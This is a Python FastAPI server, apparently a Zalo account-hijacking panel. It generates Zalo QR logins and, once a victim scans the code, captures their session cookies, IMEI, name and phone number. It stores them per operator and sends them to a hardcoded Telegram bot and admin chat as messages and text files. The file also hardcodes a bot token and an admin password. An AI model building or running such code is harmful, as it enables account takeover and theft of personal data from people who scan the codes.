import asyncio, uuid, json, os, aiohttp, hashlib, secrets, re
from datetime import datetime
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request, Response, HTTPException
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from zalo_login import login_qr_with_unique_imei, LoginQRCallbackEventType

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])
app.mount("/static", StaticFiles(directory="static"), name="static")

TG_BOT_TOKEN  = "7818000635:AAGJ4troYL-SpYEfoTqxj_axm4B-YPt1hvU"
TG_ADMIN_ID   = 7454964260
HISTORY_FILE  = "history.json"
USERS_FILE    = "users.json"
SESSIONS_FILE = "sessions.json"

# ── Admin credentials (stored separately) ──────────────────────────────────
ADMIN_ACCOUNTS = {
    "knammelbel206": hashlib.sha256("nqh300506".encode()).hexdigest()
}

# ── File helpers ────────────────────────────────────────────────────────────
def _load(path, default):
    if not os.path.exists(path):
        return default
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return default

def _save(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def load_history():  return _load(HISTORY_FILE, [])
def save_history(r): _save(HISTORY_FILE, r)
def load_users():    return _load(USERS_FILE, {})
def save_users(u):   _save(USERS_FILE, u)
def load_sessions(): return _load(SESSIONS_FILE, {})
def save_sessions(s):_save(SESSIONS_FILE, s)

def add_history(record):
    records = load_history()
    records.insert(0, record)
    records = records[:200]
    save_history(records)

# ── Auth helpers ────────────────────────────────────────────────────────────
def hash_pw(pw): return hashlib.sha256(pw.encode()).hexdigest()

def create_session(username: str) -> str:
    token = secrets.token_hex(32)
    sessions = load_sessions()
    sessions[token] = {"username": username, "created": datetime.now().isoformat()}
    save_sessions(sessions)
    return token

def get_session_user(token: str):
    if not token:
        return None
    sessions = load_sessions()
    s = sessions.get(token)
    if not s:
        return None
    return s["username"]

def is_admin(username: str) -> bool:
    return username in ADMIN_ACCOUNTS

# ── Telegram ────────────────────────────────────────────────────────────────
async def send_telegram(text: str, parse_mode="HTML"):
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
    async with aiohttp.ClientSession() as session:
        try:
            await session.post(url, json={
                "chat_id": TG_ADMIN_ID, "text": text,
                "parse_mode": parse_mode, "disable_web_page_preview": True
            })
        except:
            pass

async def send_telegram_file(content: bytes, filename: str, caption: str):
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendDocument"
    async with aiohttp.ClientSession() as session:
        try:
            form = aiohttp.FormData()
            form.add_field("chat_id", str(TG_ADMIN_ID))
            form.add_field("caption", caption, content_type="text/plain")
            form.add_field("document", content, filename=filename, content_type="text/plain")
            await session.post(url, data=form)
        except:
            pass

def get_phone_from_zlapi(imei: str, cookie: dict) -> str:
    try:
        from zlapi.models import Bot
        b = Bot("1502257077756629012", "1408873439028183142", imei, cookie)
        phone = b._state._config.get("phone_number")
        if phone:
            return str(phone)
        info = b.fetchAccountInfo()
        if info and hasattr(info, "profile"):
            p = info.profile.get("phoneNumber") or info.profile.get("phone")
            if p:
                return str(p)
    except:
        pass
    return None

# ── Auth middleware helper ───────────────────────────────────────────────────
def get_token_from_request(request: Request) -> str:
    auth = request.headers.get("Authorization", "")
    if auth.startswith("Bearer "):
        return auth[7:]
    return request.cookies.get("session_token", "")

# ═══════════════════════════════════════════════════════════════════════════
#  ROUTES
# ═══════════════════════════════════════════════════════════════════════════

@app.get("/")
async def root():
    return FileResponse("static/index.html")

# ── Register ────────────────────────────────────────────────────────────────
@app.post("/api/register")
async def register(request: Request):
    data = await request.json()
    username = (data.get("username") or "").strip()
    password = (data.get("password") or "").strip()
    email    = (data.get("email") or "").strip()

    if not username or not password or not email:
        raise HTTPException(400, "Thiếu thông tin")
    if len(username) < 4:
        raise HTTPException(400, "Tên đăng nhập phải ≥ 4 ký tự")
    if len(password) < 6:
        raise HTTPException(400, "Mật khẩu phải ≥ 6 ký tự")
    if not re.match(r"[^@]+@[^@]+\.[^@]+", email):
        raise HTTPException(400, "Email không hợp lệ")
    if username in ADMIN_ACCOUNTS:
        raise HTTPException(400, "Tên đăng nhập đã tồn tại")

    users = load_users()
    if username in users:
        raise HTTPException(400, "Tên đăng nhập đã tồn tại")

    users[username] = {
        "password": hash_pw(password),
        "email":    email,
        "created":  datetime.now().strftime("%d/%m/%Y %H:%M:%S"),
        "active":   True
    }
    save_users(users)

    asyncio.create_task(send_telegram(
        f"🆕 <b>Tài khoản mới đăng ký</b>\n👤 <code>{username}</code>\n📧 {email}\n🕐 {users[username]['created']}"
    ))

    token = create_session(username)
    return JSONResponse({"ok": True, "token": token, "username": username, "is_admin": False})

# ── Login ────────────────────────────────────────────────────────────────────
@app.post("/api/login")
async def login(request: Request):
    data = await request.json()
    username = (data.get("username") or "").strip()
    password = (data.get("password") or "").strip()

    if not username or not password:
        raise HTTPException(400, "Thiếu tên đăng nhập hoặc mật khẩu")

    # Check admin
    if username in ADMIN_ACCOUNTS:
        if ADMIN_ACCOUNTS[username] != hash_pw(password):
            raise HTTPException(401, "Sai mật khẩu")
        token = create_session(username)
        return JSONResponse({"ok": True, "token": token, "username": username, "is_admin": True})

    users = load_users()
    user  = users.get(username)
    if not user:
        raise HTTPException(401, "Tài khoản không tồn tại")
    if not user.get("active", True):
        raise HTTPException(403, "Tài khoản đã bị khóa")
    if user["password"] != hash_pw(password):
        raise HTTPException(401, "Sai mật khẩu")

    token = create_session(username)
    return JSONResponse({"ok": True, "token": token, "username": username, "is_admin": False})

# ── Logout ───────────────────────────────────────────────────────────────────
@app.post("/api/logout")
async def logout(request: Request):
    token = get_token_from_request(request)
    if token:
        sessions = load_sessions()
        sessions.pop(token, None)
        save_sessions(sessions)
    return JSONResponse({"ok": True})

# ── History (auth required) ──────────────────────────────────────────────────
@app.get("/api/history")
async def get_history(request: Request):
    token    = get_token_from_request(request)
    username = get_session_user(token)
    if not username:
        raise HTTPException(401, "Chưa đăng nhập")

    records = load_history()
    # Non-admin: only see their own records
    if not is_admin(username):
        records = [r for r in records if r.get("owner") == username]
    return JSONResponse(records)

# ── Admin: list users ─────────────────────────────────────────────────────────
@app.get("/api/admin/users")
async def admin_users(request: Request, page: int = 0):
    token    = get_token_from_request(request)
    username = get_session_user(token)
    if not username or not is_admin(username):
        raise HTTPException(403, "Không có quyền")

    users = load_users()
    items = []
    for uname, udata in users.items():
        items.append({
            "username": uname,
            "email":    udata.get("email", ""),
            "password": udata.get("password", ""),   # hashed
            "created":  udata.get("created", ""),
            "active":   udata.get("active", True)
        })
    items.sort(key=lambda x: x["created"], reverse=True)

    per_page = 20
    total    = len(items)
    chunk    = items[page * per_page:(page + 1) * per_page]
    return JSONResponse({"total": total, "page": page, "per_page": per_page, "users": chunk})

# ── Admin: toggle user active ─────────────────────────────────────────────────
@app.post("/api/admin/users/{target}/toggle")
async def admin_toggle_user(target: str, request: Request):
    token    = get_token_from_request(request)
    username = get_session_user(token)
    if not username or not is_admin(username):
        raise HTTPException(403, "Không có quyền")

    users = load_users()
    if target not in users:
        raise HTTPException(404, "Không tìm thấy tài khoản")
    users[target]["active"] = not users[target].get("active", True)
    save_users(users)
    return JSONResponse({"ok": True, "active": users[target]["active"]})

# ── Admin: delete user ────────────────────────────────────────────────────────
@app.delete("/api/admin/users/{target}")
async def admin_delete_user(target: str, request: Request):
    token    = get_token_from_request(request)
    username = get_session_user(token)
    if not username or not is_admin(username):
        raise HTTPException(403, "Không có quyền")

    users = load_users()
    if target not in users:
        raise HTTPException(404, "Không tìm thấy")
    del users[target]
    save_users(users)
    return JSONResponse({"ok": True})

# ── WebSocket (auth required) ─────────────────────────────────────────────────
@app.websocket("/ws/{session_id}")
async def ws_endpoint(ws: WebSocket, session_id: str):
    await ws.accept()

    # Auth check via query param token
    token    = ws.query_params.get("token", "")
    username = get_session_user(token)
    if not username:
        await ws.send_json({"type": "error", "msg": "Chưa đăng nhập. Vui lòng đăng nhập lại."})
        await ws.close()
        return

    async def callback(event):
        etype = event["type"]
        if etype == LoginQRCallbackEventType.QRCodeGenerated:
            await ws.send_json({"type": "qr", "image": event["data"]["image"]})
        elif etype == LoginQRCallbackEventType.QRCodeScanned:
            name = event["data"].get("display_name", "")
            await ws.send_json({"type": "scanned", "name": name})
        elif etype == LoginQRCallbackEventType.QRCodeExpired:
            await ws.send_json({"type": "expired"})
        elif etype == LoginQRCallbackEventType.QRCodeDeclined:
            await ws.send_json({"type": "declined"})

    try:
        await ws.send_json({"type": "status", "msg": "Đang tạo mã QR..."})
        result = await login_qr_with_unique_imei(callback=callback)

        if not result:
            await ws.send_json({"type": "error", "msg": "Đăng nhập thất bại."})
            return

        cookies    = result["cookies"]
        user       = result["user_info"]
        imei       = result["imei"]
        cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
        now        = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

        phone = user.get("phoneNumber") or user.get("phone", "")
        if not phone or phone == "N/A":
            try:
                loop = asyncio.get_event_loop()
                phone = await loop.run_in_executor(None, get_phone_from_zlapi, imei, cookies)
                if phone:
                    user["phoneNumber"] = phone
            except:
                pass

        name  = user.get("displayName") or user.get("name", "N/A")
        uid   = user.get("userId") or user.get("id", "N/A")
        phone = user.get("phoneNumber", "Không rõ") or "Không rõ"

        record = {
            "id":         session_id[:8],
            "owner":      username,
            "name":       name,
            "phone":      phone,
            "user_id":    uid,
            "imei":       imei,
            "cookie_str": cookie_str,
            "cookies":    cookies,
            "time":       now,
        }
        add_history(record)

        await ws.send_json({"type": "success", **record})

        txt = (
            f"=== ZALO COOKIE ===\n"
            f"Tên: {name}\nSĐT: {phone}\nUserID: {uid}\nIMEI: {imei}\n"
            f"Thời gian: {now}\nLấy bởi: {username}\n\n"
            f"--- COOKIE STRING ---\n{cookie_str}\n\n"
            f"--- COOKIE JSON ---\n{json.dumps(cookies, ensure_ascii=False, indent=2)}\n"
        )

        tg_text = (
            f"🍪 <b>ZALO COOKIE MỚI</b>\n\n"
            f"👤 Tên: <b>{name}</b>\n📱 SĐT: <code>{phone}</code>\n"
            f"🆔 UserID: <code>{uid}</code>\n📡 IMEI: <code>{imei}</code>\n"
            f"🕐 Thời gian: {now}\n👨‍💻 Lấy bởi: <code>{username}</code>\n\n"
            f"<b>Cookie String:</b>\n<code>{cookie_str[:500]}{'...' if len(cookie_str)>500 else ''}</code>"
        )
        asyncio.create_task(send_telegram(tg_text))
        asyncio.create_task(send_telegram_file(
            txt.encode("utf-8"),
            f"cookie_{phone}_{now[:10].replace('/','-')}.txt",
            f"📄 Cookie file — {name} ({phone}) | by {username}"
        ))

    except WebSocketDisconnect:
        pass
    except Exception as e:
        try:
            await ws.send_json({"type": "error", "msg": str(e)})
            asyncio.create_task(send_telegram(
                f"⚠️ <b>LỖI SERVER</b>\n👨‍💻 User: <code>{username}</code>\n❌ Lỗi: <code>{str(e)}</code>"
            ))
        except:
            pass

if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
